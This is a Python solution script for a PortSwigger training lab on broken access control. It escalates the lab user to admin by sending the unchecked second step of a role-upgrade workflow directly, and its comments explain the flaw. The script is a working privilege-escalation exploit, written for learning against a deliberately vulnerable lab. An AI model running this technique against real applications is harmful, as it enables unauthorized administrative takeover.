# Lab 12 — Multi-step process with no access control on one step
# PortSwigger: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step
#
# Vulnerability: The role-upgrade flow has 2 steps; the access check only
#                runs on step 1 (the confirmation prompt), not step 2 (the
#                actual upgrade) — the developer assumed step 2 was only
#                reachable by going through step 1 first
# Aim:           Upgrade your own account to admin by sending step 2 directly
#
# Technique:
#   Step 1: POST /admin-roles  action=upgrade&username=X         (checked)
#   Step 2: POST /admin-roles  action=upgrade&confirmed=true&username=X  (NOT checked)
#   Skip straight to step 2 using your own non-admin session.
#
# Usage: python access_control_lab12.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 12 — MULTI-STEP PROCESS: NO ACCESS CONTROL ON STEP 2")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab12.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm step 1 (the entry point) IS correctly blocked ───────
    print("\n  ── Step 1: confirm step 1 (initiate upgrade) is blocked for wiener\n")
    r_step1 = session.post(
        f"{url}/admin-roles",
        data={"username": "wiener", "action": "upgrade"}
    )
    check_status(r_step1, [401, 403], "Step 1 — initiate role upgrade")

    # ── Step 2: skip straight to step 2 (the actual upgrade) ────────────────
    print("\n  ── Step 2: skip directly to step 2 (confirmed=true) — should NOT be checked\n")
    r_step2 = session.post(
        f"{url}/admin-roles",
        data={"username": "wiener", "action": "upgrade", "confirmed": "true"}
    )
    check_status(r_step2, 200, "Step 2 — confirm role upgrade (skipping step 1)")

    # ── Step 3: verify escalation ──────────────────────────────────────────────
    print("\n  ── Step 3: verify by accessing /admin\n")
    r_admin = session.get(f"{url}/admin")
    check_status(r_admin, 200, "Access to /admin after skipping to step 2")

    print()
    print("  ℹ  The developer protected the ENTRY point of the workflow but")
    print("     assumed step 2 was unreachable without it. HTTP requests are")
    print("     independent — nothing enforces 'you must come from step 1'.")
